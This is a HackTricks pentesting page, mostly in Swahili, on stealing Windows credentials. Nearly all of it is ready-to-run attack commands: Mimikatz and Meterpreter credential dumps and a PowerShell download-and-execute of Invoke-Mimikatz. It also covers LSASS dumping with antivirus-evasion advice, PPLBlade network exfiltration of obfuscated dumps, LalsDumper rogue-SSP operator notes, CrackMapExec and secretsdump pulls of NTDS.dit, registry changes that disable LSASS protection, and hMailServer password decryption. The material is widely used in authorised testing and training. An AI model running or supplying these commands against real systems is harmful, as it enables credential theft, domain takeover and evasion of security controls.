# Kuiba Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pata mambo mengine ambayo Mimikatz inaweza kufanya kwenye** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Jifunze kuhusu baadhi ya ulinzi unaowezekana wa credentials hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutoa baadhi ya credentials.**

## Credentials na Meterpreter

Tumia [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ambayo** nimeiunda ili **kutafuta passwords na hashes** ndani ya mwathiri.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Kuzunguka AV

### Procdump + Mimikatz

Kwa kuwa **Procdump kutoka** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni zana halali ya Microsoft**, haigunduliki na Defender.\
Unaweza kutumia zana hii kwa **dump the lsass process**, **download the dump** na **extract** **credentials locally** kutoka kwenye dump.

Unaweza pia kutumia [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Mchakato huu unafanywa moja kwa moja na [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Kumbuka**: Baadhi ya **AV** zinaweza **kutambua** matumizi ya **procdump.exe to dump lsass.exe** kama **malicious**, kwa sababu zinatambua mnyororo **"procdump.exe" and "lsass.exe"**. Kwa hivyo ni **siri zaidi** kupitisha kama **hoja** **PID** ya lsass.exe kwa procdump **badala ya** kutumia **jina lsass.exe.**

### Kudump lsass kwa **comsvcs.dll**

DLL iitwayo **comsvcs.dll** iliyopo `C:\Windows\System32` inahusika na **dumping process memory** wakati wa crash. DLL hii ina **function** iitwayo **`MiniDumpW`**, iliyoundwa kuitwa kwa kutumia `rundll32.exe`.\
Haijalishi kutumia hoja za kwanza mbili, lakini hoja ya tatu imegawanywa katika sehemu tatu. ID ya mchakato itakayodump ni sehemu ya kwanza, eneo la faili ya dump ni sehemu ya pili, na sehemu ya tatu ni neno tu **full**. Hakuna chaguzi nyingine.\
Baada ya kusoma sehemu hizi tatu, DLL inahusika kuunda faili ya dump na kuhamisha kumbukumbu za mchakato uliotajwa ndani ya faili hiyo.\
Matumizi ya **comsvcs.dll** yanawezekana kwa kudump mchakato wa lsass, hivyo kuondoa haja ya kupakia na kuendesha procdump. Mbinu hii imeelezwa kwa undani kwenye [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

Amri ifuatayo inatumiwa kwa utekelezaji:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Unaweza kuendesha mchakato huu kiotomatiki kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Bonyeza kulia kwenye Task Bar na bonyeza Task Manager
2. Bonyeza More details
3. Tafuta mchakato "Local Security Authority Process" kwenye Processes tab
4. Bonyeza kulia kwenye mchakato "Local Security Authority Process" na bonyeza "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyotiwa saini na Microsoft ambayo ni sehemu ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass na PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni Protected Process Dumper Tool inayounga mkono obfuscating memory dump na kuhamisha kwenye remote workstations bila kuiacha kwenye disk.

**Kazi kuu**:

1. Bypassing PPL protection
2. Obfuscating memory dump files to evade Defender signature-based detection mechanisms
3. Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon inabeba dumper yenye hatua tatu iitwayo **LalsDumper** ambayo haitoi kamwe wito `MiniDumpWriteDump`, hivyo EDR hooks kwenye API hiyo hazifanyi kazi:

1. **Stage 1 loader (`lals.exe`)** – inatafuta `fdp.dll` kwa nafasi ya placeholder inayojumuisha herufi 32 ndogo `d`, inaiandika juu na path kamili kwenda `rtu.txt`, inahifadhi DLL iliyorekebishwa kama `nfdp.dll`, na inaita `AddSecurityPackageA("nfdp","fdp")`. Hii inalazimisha **LSASS** iload DLL ya matendo mabaya kama Security Support Provider (SSP) mpya.
2. **Stage 2 inside LSASS** – wakati LSASS inapoload `nfdp.dll`, DLL husoma `rtu.txt`, inafanya XOR kila byte na `0x20`, na inaweka blob iliyofasiriwa kwenye memory kabla ya kuhamisha utekelezaji.
3. **Stage 3 dumper** – payload iliyopangwa tena ina-reimplement logic ya MiniDump kwa kutumia **direct syscalls** zilizoamuliwa kutoka kwa majina ya API yaliyohashiwa (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Export maalum iitwayo `Tom` inafungua `%TEMP%\<pid>.ddt`, ina-stream dump iliyocompress ya LSASS ndani ya faili, na inafunga handle ili exfiltration iweze kufanyika baadaye.

Operator notes:

* Weka `lals.exe`, `fdp.dll`, `nfdp.dll`, na `rtu.txt` katika directory ile ile. Stage 1 inaandika placeholder iliyowekwa kwa hard-code na path kamili kwenda `rtu.txt`, hivyo kuvitenganisha kuvunja mnyororo.
* Usajili hufanyika kwa kuongezea `nfdp` kwenye `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Unaweza kuweka thamani hiyo mwenyewe ili kufanya LSASS reload SSP kila boot.
* `%TEMP%\*.ddt` files ni dumps zilizocompress. Zifufue ndani ya mashine yako, kisha uzipe Mimikatz/Volatility kwa extraction ya credentials.
* Kukimbia `lals.exe` kunahitaji admin/SeTcb rights ili `AddSecurityPackageA` ifanikiwe; mara wito unaporudi, LSASS inaload kwa uwazi rogue SSP na inatea Stage 2.
* Kuondoa DLL kutoka disk hakaiiondoe kutoka LSASS. Au futa entry ya registry na restart LSASS (reboot) au uiiache kwa persistence ya muda mrefu.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump the NTDS.dit kutoka kwa DC lengwa
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Toa historia ya nywila ya NTDS.dit kutoka DC lengwa
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Onyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Kuiba SAM & SYSTEM

Faili hizi zinapaswa kuwa **ziko** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM_. Lakini **hutawezi kuzikopia kwa njia ya kawaida** kwa sababu zinalindwa.

### Kutoka kwenye Registry

Njia rahisi zaidi ya kuiba faili hizo ni kupata nakala kutoka kwenye Registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pakua** faili hizo kwenye mashine yako ya Kali na **toa hashes** ukitumia:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Unaweza kunakili faili zilizolindwa kwa kutumia huduma hii. Unahitaji kuwa Administrator.

#### Kutumia vssadmin

binary ya vssadmin inapatikana tu katika matoleo ya Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Lakini unaweza kufanya vivyo hivyo kutoka **Powershell**. Hii ni mfano wa **jinsi ya kunakili SAM file** (diski ngumu inayotumika ni "C:" na imehifadhiwa katika C:\users\Public) lakini unaweza kutumia hii kwa kunakili faili yoyote iliyolindwa:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Msimbo kutoka kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Mwishowe, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) ili kufanya nakala ya SAM, SYSTEM na ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.

Within this database, three primary tables are maintained:

- **Data Table**: Jedwali hili lina jukumu la kuhifadhi maelezo kuhusu vitu kama watumiaji na makundi.
- **Link Table**: Inahifadhi kumbukumbu za uhusiano, kama uanachama wa makundi.
- **SD Table**: **Security descriptors** za kila kitu zinahifadhiwa hapa, zikihakikisha usalama na udhibiti wa upatikanaji kwa vitu vilivyohifadhiwa.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### Decrypting the hashes inside NTDS.dit

The hash is cyphered 3 times:

1. Dekripisha Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
2. Dekripisha **hash** using **PEK** and **RC4**.
3. Dekripisha the **hash** using **DES**.

**PEK** have the **same value** in **every domain controller**, but it is **cyphered** inside the **NTDS.dit** file using the **BOOTKEY** of the **SYSTEM file of the domain controller (is different between domain controllers)**. This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kunakili NTDS.dit kwa kutumia Ntdsutil

Inapatikana tangu Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Unaweza pia kutumia hila ya [**volume shadow copy**](#stealing-sam-and-system) kunakili faili ya **ntds.dit**. Kumbuka kwamba utahitaji pia nakala ya **SYSTEM file** (mara nyingine tena, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **Kuchukua hashes kutoka NTDS.dit**

Mara tu **umepata** faili **NTDS.dit** na **SYSTEM**, unaweza kutumia zana kama _secretsdump.py_ ili **kuchukua hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Unaweza pia **kuvitoa moja kwa moja** kwa kutumia mtumiaji halali wa domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Kwa **mafaili makubwa ya NTDS.dit** inashauriwa kuyachota kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Mwisho, unaweza pia kutumia **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Kutoa vitu vya domain kutoka NTDS.dit hadi hifadhidata ya SQLite**

Vitu vya NTDS vinaweza kuchotolewa hadi hifadhidata ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio siri tu zinazoondolewa bali pia vitu vyote na sifa zao kwa ajili ya uchimbaji wa taarifa zaidi endapo faili ghafi ya NTDS.dit tayari imepatikana.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive is optional but allow for secrets decryption (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Pamoja na taarifa nyingine, data ifuatayo hutolewa: akaunti za watumiaji na za mashine na hashes zao, UAC flags, timestamp ya last logon na password change, accounts description, majina, UPN, SPN, vikundi na recursive memberships, organizational units tree na uanachama, trusted domains pamoja na trusts type, direction na attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Unaweza kutumia binary hii kutoa credentials kutoka kwa software mbalimbali.
```
lazagne.exe all
```
## Zana nyingine za kuchukua credentials kutoka SAM na LSASS

### Windows credentials Editor (WCE)

Chombo hiki kinaweza kutumika kuchukua credentials kutoka kwenye kumbukumbu. Pakua kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Chukua credentials kutoka kwenye faili ya SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Toa credentials kutoka kwenye SAM file
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pakua kutoka:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) na iendeshe tu, nywila zitatolewa.

## Kuchimba vikao vya RDP visiyotumika na kudhoofisha vidhibiti vya usalama

Ink Dragon’s FinalDraft RAT inajumuisha tasker ya `DumpRDPHistory` ambayo mbinu zake ni za msaada kwa red-teamer yeyote:

### DumpRDPHistory-style ukusanyaji wa telemetry

* **Outbound RDP targets** – changanua kila user hive katika `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Kila subkey huhifadhi jina la seva, `UsernameHint`, na timestamp ya uandishi wa mwisho. Unaweza kuiga mantiki ya FinalDraft kwa PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – uliza logi ya `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` kwa Event IDs **21** (successful logon) na **25** (disconnect) ili kubaini ni nani alisimamia mashine:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Mara utakapojua ni Domain Admin gani huunganishwa mara kwa mara, dump LSASS (kwa LalsDumper/Mimikatz) wakati session yao **disconnected** bado ipo. CredSSP + NTLM fallback huacha verifier zao na tokens ndani ya LSASS, ambazo zinaweza kutumika tena kupitia SMB/WinRM kuchukua `NTDS.dit` au kuandaa persistence kwenye domain controllers.

### Registry downgrades zinazolengwa na FinalDraft

Implant ile ile pia inaingilia funguo kadhaa za registry ili kufanya uiba wa credentials kuwa rahisi:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Kuweka `DisableRestrictedAdmin=1` kunalazimisha kutumika tena kikamilifu kwa nywila/tiketi wakati wa RDP, ikiruhusu pivots za aina ya pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` inazuia UAC token filtering, hivyo local admins wanapata tokens zisizo na vikwazo kupitia mtandao.
* `DSRMAdminLogonBehavior=2` inamruhusu msimamizi wa DSRM kuingia wakati DC iko mtandaoni, ikimpa mshambuliaji akaunti nyingine ya built-in yenye ruhusa za juu.
* `RunAsPPL=0` inafuta ulinzi wa LSASS PPL, na kufanya upatikanaji wa memory kuwa rahisi kwa dumpers kama LalsDumper.

## hMailServer nywila za database (post-compromise)

hMailServer huweka nenosiri lake la DB katika `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` chini ya `[Database] Password=`. Thamani imefungwa kwa Blowfish na funguo thabiti `THIS_KEY_IS_NOT_SECRET` pamoja na swap za endianness za neno la 4-byte. Tumia mfuatano wa hex kutoka INI kwa kipande hiki cha Python:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Kwa nenosiri kwa maandishi wazi, nakili hifadhidata ya SQL CE ili kuepuka kufungwa kwa faili, pakia provider ya 32-bit, na sasisha ikiwa inahitajika kabla ya kufanya query kwenye hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Safu ya `accountpassword` inatumia muundo wa hash wa hMailServer (hashcat mode `1421`). Kuvunja thamani hizi kunaweza kutoa credentials zinazoweza kutumika tena kwa pivots za WinRM/SSH.
## Marejeleo

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
